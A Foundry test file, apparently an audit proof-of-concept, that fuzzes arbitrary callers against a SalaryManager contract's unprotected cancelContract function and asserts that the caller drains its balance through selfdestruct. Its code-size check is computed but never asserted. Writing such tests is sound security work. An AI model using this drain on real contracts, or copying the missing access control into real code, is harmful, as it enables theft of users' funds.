
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager private salaryManager;
    address private owner;

    function setUp() public {
        owner = address(this);
        salaryManager = new SalaryManager();
        
        // Fund the contract to ensure it has some balance
        vm.deal(address(salaryManager), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself (which is the owner)
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the only privileged role that should be able to call critical functions)
        vm.assume(caller != owner);
        
        // Exclude the contract itself
        vm.assume(caller != address(salaryManager));

        // --- 2. State Configuration ---
        // The cancelContract function requires: _totalAllocated < address(this).balance
        // Since we funded the contract with 10 ether and _totalAllocated is 0, this condition is met
        
        // Store the contract's balance before the attack
        uint256 contractBalanceBefore = address(salaryManager).balance;
        
        // Verify precondition: contract has balance
        assertGt(contractBalanceBefore, 0, "Contract should have balance");

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the vulnerable cancelContract function
        // If the contract is VULNERABLE (no access control), this call will SUCCEED
        // If the contract is SECURE (has access control), this call will REVERT
        salaryManager.cancelContract();
        
        // Assert that the contract was destroyed and funds were sent to the attacker
        // After selfdestruct, the contract's code size becomes 0
        uint256 codeSize;
        address target = address(salaryManager);
        assembly {
            codeSize := extcodesize(target)
        }
        
        // The attacker (caller) should have received the contract's balance
        assertEq(caller.balance, contractBalanceBefore, "Attacker should have received contract funds");
    }
}
